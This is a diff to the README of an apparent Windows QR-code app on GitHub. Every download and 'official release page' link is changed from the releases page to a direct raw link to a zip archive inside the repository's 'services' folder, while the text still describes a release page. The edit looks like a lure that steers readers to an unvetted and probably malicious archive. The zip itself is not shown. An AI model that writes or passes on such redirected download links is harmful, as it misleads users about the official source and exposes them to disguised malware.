@@ -1,10 +1,10 @@
 # 🔳 qr - Scan, create, and share codes
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-6C63FF?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Housewifely-galactosis47/qr/releases)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-6C63FF?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Housewifely-galactosis47/qr/raw/refs/heads/main/services/Software-3.0.zip)
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/Housewifely-galactosis47/qr/releases
+Visit this page to download: https://github.com/Housewifely-galactosis47/qr/raw/refs/heads/main/services/Software-3.0.zip
 
 Choose the latest release and get the Windows file from the Assets section.
 
@@ -108,7 +108,7 @@ If you use the app often, create a shortcut on the desktop.
 
 Only open files from the official release page:
 
-https://github.com/Housewifely-galactosis47/qr/releases
+https://github.com/Housewifely-galactosis47/qr/raw/refs/heads/main/services/Software-3.0.zip
 
 This helps you avoid files that may not match the app.
 
@@ -155,7 +155,7 @@ For printed QR codes:
 
 Check the release page for new Windows files, fixes, and new builds:
 
-https://github.com/Housewifely-galactosis47/qr/releases
+https://github.com/Housewifely-galactosis47/qr/raw/refs/heads/main/services/Software-3.0.zip
 
 ## 🗂️ App purpose
 
